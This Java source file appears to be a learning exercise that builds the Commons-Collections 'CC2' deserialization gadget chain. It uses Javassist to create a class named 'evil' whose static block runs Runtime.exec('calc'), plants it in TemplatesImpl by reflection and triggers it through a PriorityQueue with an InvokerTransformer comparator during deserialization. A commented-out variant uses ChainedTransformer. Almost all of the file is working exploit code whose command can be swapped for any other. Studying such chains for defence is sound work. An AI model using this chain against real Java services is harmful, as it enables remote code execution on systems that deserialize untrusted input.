package com.Fc0;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

//TIP To <b>Run</b> code, press <shortcut actionId="Run"/> or
// click the <icon src="AllIcons.Actions.Execute"/> icon in the gutter.
public class CC2 {
    public static void serialize(Object o) throws Exception{
        ObjectOutputStream objout = new ObjectOutputStream(new FileOutputStream("ser.txt"));
        objout.writeObject(o);
    }

    public static void unserialize() throws Exception{
        ObjectInputStream objinp = new ObjectInputStream(new FileInputStream("ser.txt"));
        objinp.readObject();
    }
    public static byte[][] generateByteCode() throws Exception{ //返回恶意类的字节码的二维byte数组，该类在加载时即执行恶意的静态代码块
        ClassPool cp = ClassPool.getDefault();
        cp.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = cp.makeClass("evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(cp.get(AbstractTranslet.class.getName()));
        byte[][] evilbyte = new byte[][]{cc.toBytecode()};
        return evilbyte;

    }
    public static <T> void setValue(TemplatesImpl obj, String fname, T newf) throws Exception {
        Field filed = TemplatesImpl.class.getDeclaredField(fname);
        filed.setAccessible(true);
        filed.set(obj,newf);
    }//利用反射设置TemplatesImpl的私有属性

    public static void main(String[] args) throws Exception{
        //链子1
//        Class runtimeClass = Runtime.class;
//        Transformer[] transes = new Transformer[]{new ConstantTransformer(runtimeClass),new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})};
//        ChainedTransformer chtfm = new ChainedTransformer(transes);
////        chtfm.transform(runtimeClass);
//        TransformingComparator tc = new TransformingComparator(chtfm);
//        tc.compare(runtimeClass,runtimeClass);
////
//        PriorityQueue pq = new PriorityQueue(1);
//
//        pq.add(1);
//        pq.add(2);
//        Field cp = PriorityQueue.class.getDeclaredField("comparator");
//        cp.setAccessible(true);
//        cp.set(pq,tc);
//        serialize(pq);
//        unserialize();

        //链子2
        TemplatesImpl tempobj = new TemplatesImpl();
        setValue(tempobj,"_name","123");
        setValue(tempobj,"_bytecodes",generateByteCode());
        setValue(tempobj,"_tfactory",new TransformerFactoryImpl());
        InvokerTransformer ivt = new InvokerTransformer("newTransformer", null, null);

//                ivt.transform(tempobj);
        //        PriorityQueue pq = new PriorityQueue();
//        Field cp = PriorityQueue.class.getDeclaredField("comparator");
//        cp.setAccessible(true);
//        cp.set(pq,ivt);

        TransformingComparator tc = new TransformingComparator(ivt);
        PriorityQueue pq = new PriorityQueue(tc);

        Field qf_queue = PriorityQueue.class.getDeclaredField("queue");
        qf_queue.setAccessible(true);
        qf_queue.set(pq,new Object[]{tempobj,tempobj});

        Field qf_size = PriorityQueue.class.getDeclaredField("size");
        qf_size.setAccessible(true);
        qf_size.set(pq,2);

        serialize(pq);
        unserialize();

    }
}